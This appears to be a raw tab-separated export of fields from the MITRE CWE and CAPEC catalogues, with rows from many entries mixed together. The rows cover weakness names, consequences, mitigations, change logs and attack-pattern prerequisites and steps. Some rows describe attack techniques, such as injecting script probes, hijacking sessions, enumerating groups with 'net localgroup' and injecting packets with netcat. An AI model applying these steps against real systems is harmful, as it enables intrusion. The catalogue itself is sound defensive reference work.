23140	100	The MITRE Corporation
23651	76	2015-11-09
14534	35	MITRE
20429	88	Weak Password Requirements
11948	80	The adversary requires strong inter-personal and communication skills.
15507	62	added/updated white box definitions
12199	72	Inconsistent locking discipline can lead to deadlock.
11833	21	CLASP
21861	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, References, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity
15562	50	There are tools to scan HTTP requests to the server for valid URL such as URLScan from Microsoft (http://www.microsoft.com/technet/security/tools/urlscan.mspx).
19729	99	Red Hat
16848	35	MITRE
16775	101	CAPEC Content Team
10999	79	Access Control
5671	91	Implementation
17860	28	CWE Content Team
10596	62	updated Relationships, Taxonomy_Mappings
7817	35	Cigital
6468	101	CAPEC Content Team
10116	28	Eric Dalci
13892	31	699
17690	101	CAPEC Content Team
8369	35	MITRE
10009	39	2008-09-08
5749	28	CWE Content Team
13312	45	Variant
17879	104	348
5885	66	Mass Assignment Vulnerability in ASP.NET MVC
23043	28	CWE Content Team
15146	73	Verify permissions on target directory
8562	67	Medium
5974	103	Primary
10273	61	Draft
11971	96	2009-03-03
14558	39	2017-11-08
22398	35	MITRE
10342	35	MITRE
23696	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
6832	28	CWE Content Team
19015	39	2011-06-01
24772	81	Access Control
13394	53	The MITRE Corporation
22337	28	Eric Dalci
5937	31	1000
24414	81	Availability
18080	76	2018-07-31
5904	28	Eric Dalci
11314	33	Alexander Polyakov
14070	43	Simple
8015	28	CWE Content Team
9580	63	Read Memory
8470	81	Availability
13948	40	Advanced knowledge about the download and update installation processes.
15129	28	CWE Content Team
18355	28	CWE Content Team
14535	56	ChildOf
14083	39	2011-06-27
14583	35	Cigital
21981	21	PLOVER
7838	89	Standard
10598	31	699
11700	35	MITRE
11905	28	CWE Content Team
13104	39	2014-07-30
24702	28	CWE Content Team
9935	59	Updated Description Summary, Related_Attack_Patterns, Related_Weaknesses
20844	43	Simple
6462	28	CWE Content Team
10488	90	C
11354	39	2017-05-03
10300	62	updated Description, Potential_Mitigations
9539	35	MITRE
7837	35	MITRE
8808	39	2008-07-01
12608	35	MITRE
8187	39	2010-04-05
12539	50	Certification Authorities need to stop using the weak collision prone MD5 hashing algorithm to hash the certificates that they are about to sign. Instead they should be using stronger hashing functions such as SHA-256 or SHA-512.
22481	35	MITRE
15958	23	Persistent cookies are cookies that are stored on the browser's hard drive. This can cause security and privacy issues depending on the information stored in the cookie and how it is accessed.
14228	28	CWE Content Team
8121	61	Stable
21378	35	MITRE
21245	79	Integrity
12595	43	Simple
9843	45	Base
15408	39	2011-09-13
15924	39	2011-06-01
6009	62	updated Relationships
11239	39	2011-06-01
20265	28	CWE Content Team
18518	31	699
17852	62	updated Relationships, Taxonomy_Mappings
16338	39	2008-09-08
11847	28	CWE Content Team
18397	40	The separation between data plane and control plane is not ensured, through either developer error or an underlying weakness in the data access layer code generation framework
10672	46	This issue makes it more difficult to understand and maintain the software, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.
7947	39	2012-05-11
19530	101	CAPEC Content Team
14680	39	2008-09-08
15685	35	MITRE
19269	89	Standard
20116	55	CAPEC Content Team
20660	28	CWE Content Team
10222	28	CWE Content Team
10688	45	Base
17490	39	2012-10-30
21987	56	ChildOf
24407	56	ChildOf
16283	63	Reduce Reliability
12967	100	The MITRE Corporation
6212	91	Implementation
6003	28	CWE Content Team
7034	45	Base
13854	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
7495	28	CWE Content Team
5802	46	When an attacker can modify an externally-controlled format string, this can lead to buffer overflows, denial of service, or data representation problems.             It should be noted that in some circumstances, such as internationalization, the set of format strings is externally controlled by design. If the source of these format strings is trusted (e.g. only contained in library files that are only modifiable by the system administrator), then the external control might not itself pose a vulnerability.
22747	97	Cross Site Identification
6782	92	Experiment
21865	21	PLOVER
20555	62	updated Relationships, Taxonomy_Mappings
17631	63	Execute Unauthorized Code or Commands
24163	28	CWE Content Team
10622	61	Stable
5925	35	MITRE
16075	104	270
24820	62	updated Demonstrative_Examples, Description, Name, Potential_Mitigations, Relationships
7071	63	DoS: Resource Consumption (CPU)
8412	39	2010-06-21
24405	39	2011-06-01
21578	31	1000
18863	59	Updated Related_Weaknesses
11974	80	Adversaries must be able to register DNS hostnames/URL’s.
14303	39	2008-08-15
21797	28	CWE Content Team
9400	88	Improper Neutralization of Alternate XSS Syntax
13733	30	John F. Miller
23694	26	Operation
11461	28	CWE Content Team
12540	31	1000
18975	28	CWE Content Team
21593	35	MITRE
18718	35	MITRE
23765	28	CWE Content Team
23338	28	CWE Content Team
14317	47	Read Data
12787	28	CWE Content Team
12850	39	2014-07-30
19433	28	CWE Content Team
7658	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
9792	55	CAPEC Content Team
17776	94	Successful attacks of this nature can result in a wide variety of consequences and negatively impact confidentiality and integrity based on the adversary's subsequent actions.
24145	67	Medium
5850	39	2012-05-11
24180	38	An IDS filtering network traffic may be able to detect illegal UTF-8 characters.
11671	51	2017-01-06
22092	43	Simple
24133	43	Simple
16922	42	Ensure that all reserved fields are set to zero before messages are sent and that no unnecessary information is included.
15887	39	2009-10-29
13471	62	updated Relationships, Taxonomy_Mappings
24423	28	CWE Content Team
6691	45	Base
14633	62	updated Demonstrative_Examples, References, Research_Gaps, Taxonomy_Mappings
20411	54	Low
12769	23	The software performs an operation on a resource at the wrong phase of the resource's lifecycle, which can lead to unexpected behaviors.
20971	26	Architecture and Design
17872	63	DoS: Amplification
18246	63	Modify Files or Directories
11350	28	CWE Content Team
25333	21	7 Pernicious Kingdoms
24293	39	2017-11-08
23940	103	Primary
20662	31	1000
14127	66	Complete Mediation
19484	39	2008-09-08
8909	91	Architecture and Design
13024	79	Confidentiality
20415	39	2008-10-14
12014	26	Architecture and Design
20149	28	CWE Content Team
8115	97	TCP SYN Scan
12153	21	Anonymous Tool Vendor (under NDA)
8397	40	The adversary requires access as an authenticated user on the system. This attack pattern relates to elevating privileges.
6845	67	High
7301	35	Cigital
20647	101	CAPEC Content Team
21204	90	Language-Independent
21212	62	updated Common_Consequences
16852	39	2011-06-27
8291	63	Execute Unauthorized Code or Commands
15303	28	CWE Content Team
5900	31	1000
21180	39	2009-03-10
12433	39	2009-05-27
20040	43	Simple
24101	92	Explore
18114	39	2011-06-27
18365	73	An attacker makes many anonymous connections and records the session IDs assigned.
15944	56	ChildOf
8130	94	Run Arbitrary Code
17856	91	Requirements
10943	35	MITRE
8678	55	CAPEC Content Team
14957	35	MITRE
7652	62	updated Relationships
11394	103	Primary
14221	103	Primary
16724	35	MITRE
19229	31	1000
9665	59	Updated Activation_Zone, Attack_Prerequisites, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact, Related_Attack_Patterns, Related_Weaknesses, Resources_Required
7767	39	2010-02-16
18046	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
20644	39	2017-11-08
14456	76	2017-01-09
19426	26	Operation
13548	28	CWE Content Team
15124	63	Read Files or Directories
22860	73	Observe inputs using web inspection tools (OWASP's WebScarab, Paros, TamperData, TamperIE, etc.)
22751	90	Language-Independent
5582	62	updated Related_Attack_Patterns
15176	39	2011-06-01
7761	43	Simple
23153	74	1
11608	81	Confidentiality
15926	70	Rooting SIM Cards
19234	62	updated Relationships
16057	40	The target software utilizes some sort of cryptographic algorithm.
16781	33	Michael Howard
19734	39	2012-05-11
7102	25	Low
20135	62	updated Relationships
13328	39	2017-01-19
24373	71	2005
23255	86	http://blog.mhartl.com/2008/09/21/mass-assignment-in-rails-applications/
18308	62	updated Common_Consequences
24631	25	Medium
22013	97	RFID Chip Deactivation or Destruction
22174	55	CAPEC Content Team
18296	35	MITRE
6282	42	For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.
6121	35	MITRE
10953	39	2012-05-11
18878	62	updated Potential_Mitigations, Time_of_Introduction
5947	39	2009-03-10
24834	46	Typically, this can allow attackers to read sensitive information from other memory locations or cause a crash.  A crash can occur when the code reads a variable amount of data and assumes that a sentinel exists to stop the read operation, such as a NUL in a string.  The expected sentinel might not be located in the out-of-bounds memory, causing excessive data to be read, leading to a segmentation fault or a buffer overflow.  The software may modify an index or perform pointer arithmetic that references a memory location that is outside of the boundaries of the buffer.  A subsequent read operation then produces undefined or unexpected results.
14801	63	Varies by Context
7445	88	Windows Shortcut Following (.LNK)
22503	103	Primary
21688	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
24012	33	Heqing Huang
7994	35	MITRE
11645	89	Detailed
8283	81	Confidentiality
24853	56	ChildOf
19514	62	updated Relationship_Notes, Relationships
14934	72	Horizontal escalation of privilege is possible (one user can view/modify information of another user).
18349	28	CWE Content Team
13581	39	2009-05-27
17294	59	Updated Activation_Zone, Injection_Vector, Payload, Payload_Activation_Impact, Related_Weaknesses, Typical_Likelihood_of_Exploit
10070	56	ChildOf
21392	76	2017-01-09
6457	97	Port Scanning
23863	62	updated Related_Attack_Patterns
13536	39	2008-09-08
10830	39	2014-07-30
23247	35	MITRE
20236	31	699
16191	28	CWE Content Team
24668	52	Set up an untrusted endpoint (e.g. a server) with which the software will connect.  Create a test certificate that uses an invalid hostname but is signed by a trusted CA and provide this certificate from the untrusted endpoint. If the software performs any operations instead of disconnecting and reporting an error, then this indicates that the hostname is not being checked and the test certificate has been accepted.
10117	62	updated Relationships, Taxonomy_Mappings
8359	100	The MITRE Corporation
24617	51	2014-06-23
8766	39	2010-12-13
25085	35	MITRE
11749	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Source code Weakness Analyzer                            Context-configured Source Code Weakness Analyzer
19359	62	updated Relationships
24145	58	In Windows based environments that have access control, impersonation is used so that access checks can be performed on a client identity by a server with higher privileges. By impersonating the client, the server is restricted to client-level security -- although in different threads it may have much higher privileges.
16537	28	CWE Content Team
9886	57	Indirect
12187	40	The ability to send a timestamp request to a remote target and receive a response.
7704	62	updated Relationships
15856	88	Incorrect Use of Privileged APIs
21908	88	EJB Bad Practices: Use of Synchronization Primitives
23940	56	ChildOf
21751	35	Cigital
5771	35	MITRE
15763	79	Confidentiality
17415	39	2014-07-30
14822	39	2019-01-03
7984	39	2019-06-20
18951	89	Standard
8414	62	updated Description, Name, Relationships
9094	31	1000
15814	42	Protect the application's sessions from information leakage. Make sure that a session's data is not used or visible by other sessions.
12493	56	ChildOf
21126	46	This could allow an attacker to access or modify system files or other files that are critical to the application.             Path manipulation errors occur when the following two conditions are met:                             1. An attacker can specify a path used in an operation on the filesystem.                2. By specifying the resource, the attacker gains a capability that would not otherwise be permitted.                          For example, the program may give the attacker the ability to overwrite the specified file or run with a configuration controlled by the attacker.
16472	28	CWE Content Team
15890	39	2008-07-01
20989	79	Confidentiality
10548	55	CAPEC Content Team
5721	103	Primary
20619	43	Simple
13200	76	2019-09-30
9077	62	updated Potential_Mitigations
16246	50	Deletion of data should be completed promptly when requested.
5657	53	The MITRE Corporation
23708	104	663
18363	74	4
10590	61	Draft
13159	89	Detailed
6771	58	Various Unix FTP servers require a password file that is under the FTP root, due to use of chroot.
11673	35	Cigital
16226	26	Architecture and Design
8863	77	Automated Static Analysis - Source Code
5911	62	updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings
25151	102	ChildOf
19278	28	CWE Content Team
10076	62	updated Common_Consequences
5817	31	1000
21634	62	updated Other_Notes, Relationship_Notes
20942	70	Bitsquatting: DNS Hijacking without exploitation
10361	35	MITRE
14753	35	MITRE
13178	62	updated Description, Maintenance_Notes, Observed_Examples, Other_Notes, Potential_Mitigations, Relationships
8327	28	CWE Content Team
5694	39	2015-12-07
17281	26	Implementation
16422	54	High
25350	80	Given a vulnerable phone system, the attackers' technical vector relies on attacks that are well documented in cracker 'zines and have been around for decades.
6154	39	2011-06-27
23851	91	Architecture and Design
18658	28	CWE Content Team
12651	56	ChildOf
12901	81	Access Control
10505	72	An attacker may ultimately redirect a user to a malicious website, by deceiving the user into believing the URL they are accessing is a trusted domain. However, the attack can also be used to forge log entries by using homoglyphs in usernames. Homoglyph manipulations are often the first step towards executing advanced attacks such as stealing a user's credentials, Cross-Site Scripting (XSS), or log forgery. If an attacker redirects a user to a malicious site, the attacker can mimic a trusted domain to steal account credentials and perform actions on behalf of the user, without the user's knowledge. Similarly, an attacker could create a username for a website that contains homoglyph characters, making it difficult for an admin to review logs and determine which users performed which actions.
9525	47	Modify Data
14961	72	This weakness may result in the corruption of memory, and perhaps instructions, possibly leading to a crash. If the corrupted memory can be effectively controlled, it may be possible to execute arbitrary code.
16029	24	MITRE
9062	95	The attacker accesses the server using a specific URL.
18536	62	updated Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Description, Likelihood_of_Exploit, Maintenance_Notes, Observed_Examples, Potential_Mitigations, References, Relationships, Research_Gaps
13175	62	updated Relationships
13636	100	The MITRE Corporation
24642	33	William Zeller
8774	60	15
10856	35	MITRE
9272	28	CWE Content Team
7142	66	SECURITY REQUIREMENTS FOR CRYPTOGRAPHIC MODULES
14375	63	Gain Privileges or Assume Identity
8425	28	CWE Content Team
14156	73	The attacker loads the session ID into his web browser and browses to restricted data or functionality.
12534	80	Knowlegde of the Open Systems Interconnection model (OSI model), and famililarity with Wireshark or some other packet analyzer.
12441	102	PeerOf
7811	89	Detailed
20344	70	ICMP Attacks Illustrated
22382	33	M. Howard
23591	39	2014-02-18
7009	103	Primary
12013	25	Low
15770	63	Read Files or Directories
23647	28	CWE Content Team
17374	86	http://manicode.blogspot.com/2008/08/input-validation-not-that-important.html
16593	28	CWE Content Team
5778	76	2019-04-04
10930	62	updated Common_Consequences
24517	39	2011-06-01
11886	61	Stable
19788	39	2017-11-08
7690	97	HTTP Request Smuggling
13398	35	MITRE
12269	100	The MITRE Corporation
22584	81	Other
23630	23	An adversary exploits functionality meant to identify information about user groups and their permissions on the target system to an authorized user. By knowing what users/permissions are registered on the target system, the adversary can inform further and more targeted malicious behavior. An example Windows command which can list local groups is "net localgroup".
9074	28	CWE Content Team
16630	81	Access Control
25087	66	Top 25 Series - Rank 16 - Information Exposure Through an Error Message
17999	62	updated Name
20558	62	updated Other_Notes, Relationship_Notes
17853	35	MITRE
11725	66	A Study In Scarlet: Exploiting Common Vulnerabilities in PHP Applications
7574	79	Authorization
19250	56	ChildOf
18106	28	CWE Content Team
8203	91	Architecture and Design
21450	62	updated Common_Consequences
22198	42	Developers should anticipate that special elements will be removed in the input vectors of their software system. Use an appropriate combination of black lists and whitelists to ensure only valid, expected and appropriate input is processed by the system.
8891	45	Base
18917	42	Setup generic response pages for error condition. The error page should not disclose information about the success or failure of a sensitive operation. For instance, the login page should not confirm that the login is correct and the password incorrect. The attacker who tries random account name may be able to guess some of them. Confirming that the account exists would make the login page more susceptible to brute force attack.
16428	39	2008-07-01
14800	39	2008-08-15
17100	61	Draft
15276	79	Availability
6281	89	Meta
11447	69	Incomplete
12720	90	Language-Independent
7354	28	CWE Content Team
23083	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Context-configured Source Code Weakness Analyzer
9016	62	updated Demonstrative_Examples
18054	31	699
24857	26	Implementation
7879	39	2011-06-01
7799	39	2013-02-21
12999	31	1000
17306	39	2019-09-19
6262	56	ChildOf
8044	44	High
14766	22	06
12372	31	1003
12519	62	updated Potential_Mitigations
19893	42	Randomize temporary file names. This can also be achieved by using a safe temp-file function. This will ensure that temporary files will not be created in predictable places.
9435	104	831
19915	21	PLOVER
22742	62	Significant clarification of the weakness description.
14554	35	MITRE
13063	23	An application uses a "blacklist" of prohibited values, but the blacklist is incomplete.
19747	31	1000
18097	62	updated Description, Name, White_Box_Definitions
25138	51	2014-06-23
17286	26	Implementation
8466	28	CWE Content Team
22822	28	CWE Content Team
23762	103	Primary
14374	33	Johannes Ullrich
17481	103	Primary
9569	35	MITRE
23465	43	Simple
23723	54	High
15924	28	CWE Content Team
13099	28	Eric Dalci
18732	56	ChildOf
9657	42	Use a language that provides abstractions for memory allocation and deallocation.
9717	102	ChildOf
22570	35	MITRE
14131	39	2011-06-27
16149	35	Cigital
25411	73	Use network-level packet injection tools such as netcat
7976	31	699
10503	91	Architecture and Design
24312	28	CWE Content Team
22479	35	MITRE
24708	35	Cigital
12941	40	The adversary must have the means and knowledge of how to communicate with the target in some manner.
24458	25	High
23029	88	Failure to Handle Missing Parameter
7475	40	The program expands one of the parameters passed to a function with input controlled by the user, but a later function making use of the expanded parameter erroneously considers the original, not the expanded size of the parameter.
18490	62	updated Potential_Mitigations
24951	35	MITRE
24788	28	CWE Content Team
18503	72	Attackers can bypass the security decision to access whatever is being protected. The consequences will depend on the associated functionality, but they can range from granting additional privileges to untrusted users to bypassing important security checks. Ultimately, this weakness may lead to exposure or modification of sensitive data, system crash, or execution of arbitrary code.
20792	63	Unexpected State
11230	61	Stable
18901	35	MITRE
19294	47	Hide Activities
5962	63	Modify Application Data
18795	35	Cigital
5952	31	699
20765	63	Quality Degradation
19226	103	Primary
16538	76	2017-08-04
17487	39	2012-10-30
11694	91	Build and Compilation
15518	39	2014-02-18
14018	39	2008-07-01
12042	39	2019-01-03
9278	35	MITRE
7665	21	Anonymous Tool Vendor (under NDA)
22140	40	When the integer variable is incremented or decremented to an out of range value, it gets a very different value (e.g. very small or negative number)
12609	39	2017-11-08
10273	40	The targeted application must have a reset function that returns the configuration of the application to an earlier state.
23847	28	CWE Content Team
7898	31	1003
20155	56	CanPrecede
20061	62	updated Demonstrative_Examples
18281	81	Availability
6112	88	Trust Boundary Violation
19418	55	CAPEC Content Team
9500	28	CWE Content Team
20739	57	Primary
9425	35	MITRE
23809	62	updated References
17525	73	Manually inject various script payloads into each identified entry point using a list of common script injection probes that typically work in a client-side script elements context and observe system behavior to determine if script was executed.
16839	26	Implementation
21641	28	CWE Content Team
7299	31	699
14408	91	Implementation
20148	28	CWE Content Team
12260	76	2019-04-04
15000	35	MITRE
20400	30	I. Beschastnikh
19154	39	2015-12-07
21858	30	Yifei Wang
13789	39	2019-01-03
20245	53	The MITRE Corporation
25388	31	699
24633	28	CWE Content Team
21601	100	The MITRE Corporation
20847	103	Primary
25230	23	The software does not perform access checks on a resource every time the resource is accessed by an entity, which can create resultant weaknesses if that entity's rights or privileges change over time.
12920	43	Simple
21127	81	Integrity
20527	35	MITRE
9383	74	1
12301	79	Authentication
23159	102	ChildOf
25065	28	CWE Content Team
11483	28	CWE Content Team
16379	78	High
21622	39	2010-06-21
14871	45	Variant
22737	61	Draft
7805	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
10084	43	Simple
13636	59	Updated Related_Attack_Patterns, Related_Weaknesses
11514	23	An adversary with access to download and update system software sends a maliciously altered BIOS to the victim or victim supplier/integrator, which when installed allows for future exploitation.
21680	50	Implementation: Clients should only trust UDDI, ebXML, or similar messages that are verifiably signed by a trusted party.
22245	28	CWE Content Team
16179	101	CAPEC Content Team
21420	81	Other
10359	56	ChildOf
8766	62	updated Observed_Examples
17967	39	2008-09-08
5865	40	The target must be capable of running Flash applications. In some cases, the victim must follow an attacker-supplied link.
16409	39	2009-03-10
22170	35	MITRE
18146	81	Access Control
21682	39	2011-06-01
15228	35	MITRE
24207	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.                   A developer may introduce authorization weaknesses because of a lack of understanding about the underlying technologies. For example, a developer may assume that attackers cannot modify certain inputs such as headers or cookies.
11425	62	updated Applicable_Platforms, Modes_of_Introduction, References, Relationships
19129	77	Automated Static Analysis - Binary or Bytecode
11611	62	updated Description, Relationships, Terminology_Notes
12965	35	Cigital
17517	35	MITRE
23366	101	CAPEC Content Team
17973	23	An attacker uses common delivery mechanisms such as email attachments or removable media to infiltrate the IDE (Integrated Development Environment) of a victim manufacturer with the intent of implanting malware allowing for attack control of the victim IDE environment. The attack then uses this access to exfiltrate sensitive data or information, manipulate said data or information, and conceal these actions. This will allow and aid the attack to meet the goal of future compromise of a recipient of the victim's manufactured product further down in the supply chain.
19962	28	Sean Eidemiller
7464	62	updated Type
24396	55	CAPEC Content Team
19326	56	ChildOf
12254	55	CAPEC Content Team
8169	39	2011-06-01
12920	23	The program allocates or initializes a resource such as a pointer, object, or variable using one type, but it later accesses that resource using a type that is incompatible with the original type.
23908	42	Handle exceptions appropriately in source code.
24399	97	Principal Spoof
24858	42	Use a built-in path canonicalization function (such as realpath() in C) that produces the canonical version of the pathname, which effectively removes ".." sequences and symbolic links (CWE-23, CWE-59).
14900	62	updated Relationships
8696	35	MITRE
15243	33	Robert "RSnake" Hansen
13106	35	MITRE
8727	56	ChildOf
24461	59	Updated Description Summary
8252	68	Using specific exceptions, and ensuring that exceptions are checked, helps programmers to anticipate and appropriately handle many unusual events that could occur.
8636	97	Remote Services with Stolen Credentials
16021	27	None: No specialized resources are required to execute this type of attack.
23042	40	An attacker is able to intercept or in some other way gain access to the information passed between the legitimate client and the server in order to retrieve the hash value and length of the original message.
25343	62	updated Detection_Factors, Other_Notes, Weakness_Ordinalities
8369	39	2018-03-27
20597	62	updated Related_Attack_Patterns, Relationships
25083	77	Dynamic Analysis with Manual Results Interpretation
14060	39	2014-07-30
19714	35	MITRE
6799	35	MITRE
11188	47	Read Data
10948	78	Low
20897	90	Language-Independent
17586	23	The web application does not neutralize or incorrectly neutralizes scripting elements within attributes of HTML IMG tags, such as the src attribute.
21992	39	2017-11-08
18786	33	Lars Baumgärtner, Bernd Freisleben
7070	26	Architecture and Design
21468	100	The MITRE Corporation
20833	42	Ensure that error messages only contain minimal details that are useful to the intended audience, and nobody else. The messages need to strike the balance between being too cryptic and not being cryptic enough. They should not necessarily reveal the methods that were used to determine the error. Such detailed information can be used to refine the original attack to increase the chances of success.                   If errors must be tracked in some detail, capture them in log messages - but consider what could occur if the log messages can be viewed by attackers. Avoid recording highly sensitive information such as passwords in any form. Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a username is valid or not.                   In the context of path traversal, error messages which disclose path information can help attackers craft the appropriate attack strings to move through the file system hierarchy.
22851	90	Language-Independent
8949	72	In the case of an out-of-bounds read, the attacker may have access to sensitive information. If the sensitive information contains system details, such as the current buffers position in memory, this knowledge can be used to craft further attacks, possibly with more severe consequences.
10413	39	2017-11-08
24908	43	Simple
25315	62	updated Related_Attack_Patterns
15412	62	updated Maintenance_Notes
16758	39	2009-07-27
6251	39	2009-03-10
6623	39	2011-03-29
13086	51	2014-06-23
9506	33	Matt Messier
10699	94	Denial of Service
20477	61	Draft
9464	59	Updated Related_Attack_Patterns
6236	35	MITRE
25066	28	CWE Content Team
21841	62	updated Name
6017	28	CWE Content Team
11434	35	MITRE
13817	57	Primary
25178	42	Resolve all filtered input to absolute or canonical representations before processing.
17132	39	2008-07-01
9841	50	Limit the flow of untrusted data into the privileged areas of the system that run in the higher trust zone
19720	62	updated Common_Consequences
20912	35	MITRE
19256	59	Updated Related_Weaknesses
16399	39	2018-03-27
9053	35	MITRE
17900	35	MITRE
9452	62	updated Potential_Mitigations
17049	88	Improper Synchronization
5741	62	updated Common_Consequences
6652	88	Class with Excessive Number of Child Classes
22759	62	updated References, Relationships
17034	50	To mitigate this type of an attack, an application should limit permissions to only those required and should verify the origin of all web content it loads.
11558	79	Confidentiality
16521	101	CAPEC Content Team
18868	50	The only known mitigation to this type of attack is to keep the malicious application off the system. There is nothing that can be done to the target application to protect itself from a malicious application that has been installed and executed.
19048	62	updated Relationships
19372	39	2018-03-27
17552	21	7 Pernicious Kingdoms
17345	63	Bypass Protection Mechanism
9465	56	ChildOf
20599	54	Medium
15038	39	2012-10-30
17724	35	MITRE
11505	62	updated Demonstrative_Examples, Name
7367	45	Class
21042	56	ChildOf
5637	80	Some knowledge of Java Script
20183	26	System Configuration
8211	23	The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as control elements or syntactic markers when they are sent to a downstream component.
6753	31	1000
6047	91	Implementation
9131	39	2012-05-11
17589	35	MITRE
21603	62	updated Description, Name, Relationships
20622	28	KDM Analytics
22140	50	Carefully review the service's implementation before making it available to user. For instance you can use manual or automated code review to uncover vulnerabilities such as integer overflow.
22122	76	2015-11-09
14115	35	MITRE
24399	61	Draft
10834	39	2009-03-10
8762	53	The MITRE Corporation
13838	91	Architecture and Design
11581	62	updated Time_of_Introduction
12202	50	Firewalls or ACLs which block egress ICMP error types effectively prevent UDP scans from returning any useful information.
11676	35	MITRE
17277	62	updated Potential_Mitigations
19303	79	Integrity
14723	63	Quality Degradation
20688	28	CWE Content Team
16382	33	Peter W
23278	62	updated Applicable_Platforms
12810	28	Eric Dalci
23070	101	CAPEC Content Team
10629	56	ChildOf
17197	42	Only call privileged APIs from safe, consistent and expected state.
16095	34	OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.
10893	62	updated Applicable_Platforms, Functional_Areas, Likelihood_of_Exploit, Potential_Mitigations, Time_of_Introduction
13997	56	ChildOf
17055	67	High
21538	79	Availability
10963	76	2017-08-04
12995	103	Primary
22447	88	Improper Neutralization of CRLF Sequences ('CRLF Injection')
23227	35	Veracode
23701	62	updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings
22453	23	The product uses security features in a way that prevents the product's administrator from tailoring security settings to reflect the environment in which the product is being used. This introduces resultant weaknesses or prevents it from operating at a level of security that is desired by the administrator.
23095	101	CAPEC Content Team
14656	39	2009-01-12
24808	62	updated Description, Other_Notes
25170	104	408
18820	101	CAPEC Content Team
7205	103	Primary
8031	81	Integrity
5666	28	CWE Content Team
7179	35	MITRE
15122	47	Modify Data
6991	90	Language-Independent
13723	74	4
22647	95	Because of the identical nature of the original site and the attacker controlled one, and the fact that the URL is still the original one, the victim trusts the website reached and the attacker can now "farm" sensitive information such as credentials or account numbers.
11346	39	2011-03-29
13433	35	MITRE
9598	72	When a race condition is combined with predictable resource names and loose permissions, it may be possible for an attacker to overwrite or access confidential data (CWE-59).
24572	50	Ensure cryptographic elements have been sufficiently tested for weaknesses.
10654	31	699
13992	85	49
20964	55	CAPEC Content Team
19018	50	Design: Protect the schema against unauthorized modification.
21383	39	2019-06-20
11426	34	OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.
13415	45	Base
19806	91	Architecture and Design
19876	69	Incomplete
17747	91	Architecture and Design
15148	91	Operation
20343	39	2018-03-27
24408	39	2009-01-12
7449	66	Format String Attacks
15255	26	Implementation
17830	62	updated Relationships
11251	62	updated Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Detection_Factors, Potential_Mitigations, References, Related_Attack_Patterns, Relationships, Taxonomy_Mappings, Time_of_Introduction, Type
24039	86	https://medium.com/@jitbit/target-blank-the-most-underestimated-vulnerability-ever-96e328301f4c
23481	35	MITRE
19521	35	MITRE
18707	88	Reliance on Machine-Dependent Data Representation
17166	62	updated Demonstrative_Examples, Relationships
20642	39	2017-11-08
24090	39	2010-12-13
8155	35	MITRE
10264	81	Confidentiality
16241	28	CWE Content Team
13024	79	Access Control
12713	45	Base
21689	47	Execute Unauthorized Commands
15370	35	MITRE
15461	39	2017-11-08
22564	39	2008-07-01
10530	31	1000
20533	81	Availability
22036	30	Nadya Bartol
22579	39	2009-05-27
23116	35	MITRE
22083	26	Implementation
19049	72	If a malicious user injects a character (such as a semi-colon) that delimits the end of one command and the beginning of another, it may be possible to then insert an entirely new and unrelated command that was not intended to be executed.
22845	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
19972	39	2012-10-30
9621	62	updated Potential_Mitigations
24434	79	Confidentiality
23860	28	Eric Dalci
16054	103	Primary
17406	28	CWE Content Team
22507	62	updated Applicable_Platforms, Causal_Nature, Modes_of_Introduction, Relationships, White_Box_Definitions
13987	77	Architecture or Design Review
18185	62	updated Demonstrative_Examples
16555	39	2010-04-05
10388	25	Low
13895	35	MITRE
17171	28	CWE Content Team
20173	81	Other
20318	104	508
20128	101	CAPEC Content Team
18612	45	Variant
5780	26	Architecture and Design
11999	102	ChildOf
14062	60	03
12858	35	MITRE
8844	31	1000
24428	26	Implementation
13138	77	Automated Static Analysis - Source Code
10187	35	MITRE
19707	31	699
21232	62	updated Relationships
13017	35	MITRE
17329	23	The software has a protection mechanism that is too difficult or inconvenient to use, encouraging non-malicious users to disable or bypass the mechanism, whether by accident or on purpose.
10935	28	CWE Content Team
8439	28	CWE Content Team
13595	35	MITRE
11182	50	When client input is required from web-based forms, avoid using the "GET" method to submit data, as the method causes the form data to be appended to the URL and is easily manipulated. Instead, use the "POST method whenever possible.
10512	35	MITRE
21896	28	CWE Content Team
10335	104	578
19165	76	2017-05-01
23654	28	CWE Content Team
10958	26	Implementation
9330	35	MITRE
18425	31	1000
23630	40	The adversary must have gained access to the target system via physical or logical means in order to carry out this attack.
5659	102	ChildOf
12080	62	updated Time_of_Introduction
8960	28	CWE Content Team
16378	56	ChildOf
8281	28	CWE Content Team
18179	81	Confidentiality
